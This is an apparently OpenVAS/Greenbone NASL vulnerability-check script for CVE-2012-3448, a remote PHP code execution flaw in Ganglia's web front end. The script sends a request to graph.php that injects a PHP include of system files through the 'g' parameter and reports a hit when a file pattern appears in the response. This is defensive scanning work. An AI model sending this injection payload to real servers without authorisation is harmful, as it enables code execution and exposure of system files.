CPE = "cpe:/a:ganglia:ganglia-web";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103535" );
	script_bugtraq_id( 54699 );
	script_cve_id( "CVE-2012-3448" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Ganglia PHP Code Execution Vulnerability" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-08-13 12:40:50 +0200 (Mon, 13 Aug 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_ganglia_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "ganglia/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/54699" );
	script_xref( name: "URL", value: "http://console-cowboys.blogspot.de/2012/07/extending-your-ganglia-install-with.html" );
	script_tag( name: "summary", value: "Ganglia is prone to a vulnerability that lets remote attackers execute
  arbitrary code." );
	script_tag( name: "impact", value: "Attackers can exploit this issue to execute arbitrary PHP code within
  the context of the affected web server process." );
	script_tag( name: "solution", value: "Vendor updates are available. Please see the references for more
  information." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/graph.php?g=cpu_report,include+%27/" + file + "%27";
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( data: report, port: port );
		exit( 0 );
	}
}
exit( 99 );

